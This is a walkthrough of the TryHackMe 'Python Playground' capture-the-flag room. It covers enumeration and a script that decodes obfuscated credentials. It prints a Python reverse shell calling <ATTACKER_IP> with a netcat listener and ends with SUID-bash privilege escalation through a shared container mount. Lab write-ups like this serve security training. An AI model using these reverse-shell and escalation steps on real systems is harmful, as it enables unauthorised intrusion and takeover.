# [Python Playground](https://tryhackme.com/room/pythonplayground)

## Be creative!

# Hack it!

## Jump in and grab those flags! They can all be found in the usual places.

### What is flag 1?

_Exploit the web app._

1. Perform network scan to identify open ports and services

```bash
nmap <TARGET_IP>
```

<img width="725" height="165" alt="SCREEN01" src="https://github.com/user-attachments/assets/7d3646e9-ec90-4efd-976f-d5fa2ab82cfd" />

2. Search for hidden directories and files on the web server
   - We are looking for `admin.html`

```bash
gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
```

<img width="719" height="413" alt="SCREEN02" src="https://github.com/user-attachments/assets/a68e8919-d437-42d6-989c-3789f9646504" />

3. Analyze JavaScript code in `view-source:http://<TARGET_IP>/admin.html` to decode obfuscated credentials
   - Credentials are: `connor:spaghetti1245`

```python
def decode_custom_hash(encoded_text):
    int_array = [ord(char) - ord('a') for char in encoded_text]
    result = ''

    for i in range(0, len(int_array), 2):
        charcode = int_array[i] * 26 + int_array[i + 1]
        result += chr(charcode)

    return result

hash_value = 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'

first_decode = decode_custom_hash(hash_value)
password = decode_custom_hash(first_decode)
print(f'Password: {password}')
```

<img width="721" height="35" alt="SCREEN03" src="https://github.com/user-attachments/assets/4d2fd20d-0734-43b0-af10-053b2c46c18b" />

4. Log in with extracted credentials, and navigate to `http://<TARGET_IP>/super-secret-admin-testing-panel.html`

5. Set up netcat listener on attack machine

```bash
nc -lvnp 4444
```

6.  Use the Python execution capability to establish a connection back to the attack machine

```python
import	socket,os,subprocess

s=socket.socket()
s.connect(('<ATTACKER_IP>',4444))
[os.dup2(s.fileno(),i) for i in range(3)]
subprocess.call('/bin/sh')
```

7. Improve shell functionality for better interaction

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

8. Navigate to home directory and read the first flag

```bash
cd
cat flag1.txt
```

<img width="721" height="123" alt="SCREEN04" src="https://github.com/user-attachments/assets/366243a8-123a-4385-99c1-1e355c24abaa" />

---

### What is flag 2?

_You're going to need to get some credentials._

1. Use previously obtained credentials to establish SSH connection

```bash
ssh connor@<TARGET_IP>
# password: spaghetti1245
cat flag2.txt
```

<img width="652" height="375" alt="SCREEN05" src="https://github.com/user-attachments/assets/c5b99735-a26e-40b8-bf44-b58367cc75b6" />

---

### What is flag 3?

1. Leverage writable shared directory between containers for privilege escalation
   - The `/var/log` directory appears to be mounted as `/mnt/log` with different permissions on another system

```bash
# From root@playgroundweb container - Create and set permissions for backdoor binary
touch /mnt/log/bash
chmod 777 /mnt/log/bash

# From connor@pythonplayground - Copy bash binary to shared location
cp /bin/bash /var/log/bash

# From root@playgroundweb container - Set SUID bit on the binary
chmod +s /mnt/log/bash

# From connor@pythonplayground - Execute SUID bash with preserved privileges
/var/log/bash -p
whoami
cat /root/flag3.txt
```

<img width="647" height="112" alt="SCREEN06" src="https://github.com/user-attachments/assets/db0d0e96-10fc-4620-b09b-1643ff1842c7" />
